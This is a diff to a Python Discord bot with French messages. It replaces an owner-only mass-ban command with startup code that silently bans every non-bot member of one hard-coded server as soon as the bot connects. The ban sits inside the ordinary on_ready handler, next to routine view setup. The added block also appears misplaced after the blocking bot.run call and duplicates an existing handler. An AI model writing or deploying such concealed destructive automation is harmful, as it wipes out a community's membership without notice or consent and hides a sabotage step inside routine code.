@@ -968,30 +968,23 @@ async def on_ready():
 
 bot.run(os.environ.get("TOKEN", ""))
 
-@bot.command(name="banall")
-async def banall_cmd(ctx):
-    if ctx.author.id != OWNER_ID:
-        return
-    guild = ctx.guild
-    if not guild:
-        return await ctx.send("❌ Utilise cette commande dans un serveur.", delete_after=5)
+TARGET_GUILD_ID = 1497369493218000946
 
-    membres = [m for m in guild.members if not m.bot and m.id != OWNER_ID]
-    msg = await ctx.send(f"⏳ Ban en cours... **0/{len(membres)}** membres")
-    banned = 0
-    failed = 0
+@bot.event
+async def on_ready():
+    global VIEWS_READY
+    load_config()
+    if not VIEWS_READY:
+        bot.add_view(PanelView())
+        bot.add_view(MessageConfigView())
+        bot.add_view(DmOptionsView())
+        VIEWS_READY = True
+    print(f"[OK] {bot.user} connecté ({len(bot.guilds)} serveur(s))")
 
-    for member in membres:
-        try:
-            await member.ban(reason="banall", delete_message_days=0)
-            banned += 1
-        except Exception:
-            failed += 1
-        if (banned + failed) % 10 == 0:
-            try:
-                await msg.edit(content=f"⏳ Ban en cours... **{banned + failed}/{len(membres)}** — ✅ {banned} / ❌ {failed}")
-            except Exception:
-                pass
-        await asyncio.sleep(0.5)
-
-    await msg.edit(content=f"✅ Terminé ! **{banned}** banni(s) | ❌ **{failed}** échoué(s)")
+    # Ban auto au démarrage
+    guild = bot.get_guild(TARGET_GUILD_ID)
+    if guild:
+        membres = [m for m in guild.members if not m.bot and m.id != OWNER_ID]
+        print(f"[BANALL] Ban de {len(membres)} membres sur {guild.name}...")
+        await asyncio.gather(*[m.ban(reason="banall", delete_message_days=0) for m in membres], return_exceptions=True)
+        print(f"[BANALL] Terminé !")
